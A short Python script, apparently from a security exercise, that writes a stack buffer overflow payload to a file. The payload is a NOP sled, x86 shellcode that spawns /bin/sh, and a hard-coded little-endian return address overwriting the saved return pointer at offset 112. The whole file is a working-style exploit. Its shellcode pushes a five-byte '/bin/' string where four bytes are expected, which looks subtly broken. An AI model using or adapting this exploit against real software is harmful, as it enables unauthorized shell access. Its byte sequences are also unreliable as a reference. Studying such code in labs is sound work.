#!/usr/bin/env python

def create_exploit(return_addr):
    shellcode = (
        "\x31\xc0"
        "\x50"
        "\x68""//sh"
        "\x68""/bin/"
        "\x89\xe3"
        "\x50"
        "\x53"
        "\x89\xe1"
        "\x31\xd2"
        "\xb0\x0b"
        "\xcd\x80"
    ).encode("latin-1")

    payload = bytearray(0x90 for i in range(300))
    start = 300 - len(shellcode)
    payload[start:] = shellcode
    payload[112:116] = (return_addr).to_bytes(4, byteorder="little")
    return payload

if __name__ == "__main__":
    payload = create_exploit(0xbfff3a98)
    with open("exploit", "wb") as exploit:
        exploit.write(payload)
